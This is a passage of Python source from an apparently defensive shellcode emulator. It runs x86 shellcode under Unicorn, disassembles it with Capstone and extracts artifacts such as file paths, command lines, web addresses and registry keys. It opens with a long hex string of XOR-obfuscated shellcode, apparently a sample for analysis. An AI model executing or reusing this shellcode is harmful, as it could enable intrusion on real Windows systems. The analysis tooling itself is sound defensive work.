\x52\x77\x34\x31\xd1\x51\xb9\x49\x1c\x2e\x48\xba\x69\x7a\x6a\x2d\x31\xd1\x51\xb9\x67\x67\x1d\x37\xba\x45\x47\x32\x41\x31\xd1\x51\xb9\x03\x33\x0d\x3b\xba\x71\x45\x68\x49\x31\xd1\x51\xb9\x39\x6a\x3c\x2f\xba\x55\x4a\x6f\x4a\x31\xd1\x51\xb9\x37\x44\x1f\x2e\xba\x5a\x2d\x71\x4f\x31\xd1\x51\xb9\x34\x23\x23\x3b\xba\x68\x77\x46\x49\x31\xd1\x51\xb9\x07\x3a\x0a\x14\xba\x73\x48\x65\x78\x31\xd1\x51\xb9\x14\x2e\x58\x53\xba\x48\x6d\x37\x3d\x31\xd1\x51\xb9\x3e\x3d\x26\x32\xba\x52\x6e\x43\x46\x31\xd1\x51\xb9\x33\x3c\x35\x34\xba\x5d\x48\x47\x5b\x31\xd1\x51\xb9\x36\x0e\x07\x2b\xba\x58\x7a\x44\x44\x31\xd1\x51\xb9\x3c\x10\x0a\x37\xba\x49\x62\x78\x52\x31\xd1\x51\xb9\x24\x7c\x3b\x36\xba\x61\x31\x67\x75\x31\xd1\x51\xb9\x31\x3d\x3b\x27\xba\x62\x64\x68\x73\x31\xd1\x51\xb9\x7f\x7d\x3d\x35\xba\x36\x33\x78\x69\x31\xd1\x51\xb9\x7c\x13\x0f\x2f\xba\x31\x52\x4c\x67\x31\xd1\x51\xb9\x1b\x08\x35\x2d\xba\x58\x49\x79\x72\x31\xd1\x51\xb9\x74\x3a\x1e\x21\xba\x2d\x65\x52\x6e\x31\xd1\x51\xb9\x16\x10\x1f\x17\xba\x34\x58\x54\x52\x31\xd1\x51\xb9\x2f\x27\x0c\x6e\xba\x4e\x43\x68\x4e\x31\xd1\x51\xb9\x39\x22\x5e\x50\xba\x4b\x47\x39\x70\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\x31\xc0\x50\xb8\x41\x41\x41\x65\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x1e\x53\x39\x3c\xba\x6d\x32\x5b\x50\x31\xd1\x51\xb9\x04\x66\x2f\x32\xba\x61\x46\x4b\x5b\x31\xd1\x51\xb9\x19\x1e\x0d\x11\xba\x69\x73\x62\x75\x31\xd1\x51\xb9\x20\x41\x47\x36\xba\x45\x35\x67\x59\x31\xd1\x51\xb9\x2b\x05\x64\x2a\xba\x47\x69\x44\x59\x31\xd1\x51\xb9\x10\x3f\x4f\x22\xba\x62\x5a\x38\x43\x31\xd1\x51\xb9\x2a\x6f\x2a\x24\xba\x42\x4f\x4c\x4d\x31\xd1\x51\xb9\x29\x09\x1e\x5e\xba\x47\x6c\x6a\x2d\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\x31\xc0\x50\xb8\x41\x41\x41\x6f\xc1\xe8\x08\xc1\xe8\x08\xc1\xe8\x08\x50\xb9\x72\x2a\x05\x39\xba\x52\x4b\x70\x4d\x31\xd1\x51\xb9\x54\x3a\x05\x52\xba\x35\x48\x71\x6f\x31\xd1\x51\xb9\x29\x16\x0a\x47\xba\x4c\x36\x79\x33\x31\xd1\x51\xb9\x27\x1b\x5b\x3e\xba\x55\x6d\x32\x5d\x31\xd1\x51\xb9\x33\x1a\x3b\x10\xba\x41\x77\x48\x75\x31\xd1\x51\xb9\x34\x79\x3a\x12\xba\x53\x59\x4e\x77\x31\xd1\x51\xb9\x1d\x5c\x1e\x28\xba\x72\x32\x78\x41\x31\xd1\x51\xb9\x2a\x4e\x5a\x28\xba\x59\x2d\x7a\x4b\x31\xd1\x51\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\xdc\x7a\xa8\x23\xba\x4d\x56\x36\x55\x31\xd3\xff\xd3\xbb\x9b\x4f\xd0\x30\xba\x63\x36\x46\x46\x31\xd3\xff\xd3"

    try:
        # Initialize emulator
        mu = Uc(UC_ARCH_X86, mode)
        mu.mem_map(0x00000000, 0x20050000)

        loadDlls(mu)

        # write machine code to be emulated to memory
        mu.mem_write(CODE_ADDR, code)
        address_range.append([CODE_ADDR, len(code)])

        mu.mem_write(EXTRA_ADDR, b'\xC3')

        # initialize stack
        mu.reg_write(UC_X86_REG_ESP, STACK_ADDR)
        mu.reg_write(UC_X86_REG_EBP, STACK_ADDR)

        # Push entry point addr to top of stack. Represents calling of entry point.
        push(mu, ENTRY_ADDR)
        mu.mem_write(ENTRY_ADDR, b'\x90\x90\x90\x90')

        if mode == UC_MODE_32:
            print(cya + "\n\t[*]" + res2 + " Emulating x86_32 shellcode")
            cs = Cs(CS_ARCH_X86, CS_MODE_32)
            allocateWinStructs32(mu)

        elif mode == UC_MODE_64:
            print(cya + "\n\t[*]" + res2 + " Emulating x86_64 shellcode")
            cs = Cs(CS_ARCH_X86, CS_MODE_64)
            allocateWinStructs64(mu)

        # tracing all instructions with customized callback
        mu.hook_add(UC_HOOK_CODE, hook_code)

    except Exception as e:
        print(e)

    try:
        # print("before", mu.mem_read(CODE_ADDR + em.entryOffset,20))
        # Start the emulation
        mu.emu_start(CODE_ADDR + em.entryOffset, (CODE_ADDR + em.entryOffset) + len(code))

        # print("after", mu.mem_read(CODE_ADDR + em.entryOffset,20))
        # finalOut=mu.mem_read(CODE_ADDR + em.entryOffset,len(code))
        # fRaw.giveEnd(finalOut)
        # print ("testout",test)
        print("\n")
    except Exception as e:
        print(e)
        print(traceback.format_exc())
        # print ("opps")
        # print("\t",e)
        # print("traceback", traceback.format_exc())
        # print("opps end")

    # try:
    #     finalOut = uc.mem_read(CODE_ADDR, len(code))
    #     print ("finalOut", finalOut)
    # except Exception as e:
    #     print (e)
    outFile.close()
    # now print out some registers
    path_artifacts, file_artifacts, commandLine_artifacts, web_artifacts, registry_artifacts,   exe_dll_artifacts = findArtifacts()
    # except:
    #     pass

    # now print out some registers
    path_artifacts, file_artifacts, commandLine_artifacts, web_artifacts, registry_artifacts,   exe_dll_artifacts = findArtifacts()

    print(cya+"\t[*]"+res2+" CPU counter: " + str(programCounter))
    print(cya+"\t[*]"+res2+" Emulation complete")

def startEmu(arch, data, vb):
    global verbose
    verbose = vb
    # fRaw.testBytesAdd()
    if arch == 32:
        test_i386(UC_MODE_32, data)

    # fRaw.show2()
    fRaw.merge2()
    # print ("COMPLETED!!!")
    fRaw.completed()
    # print (fRaw.APIs)
    # print ("COMPLETED2!!!")

    fRaw.findAPIs()
def haha():
    fRaw.show()


em=EMU()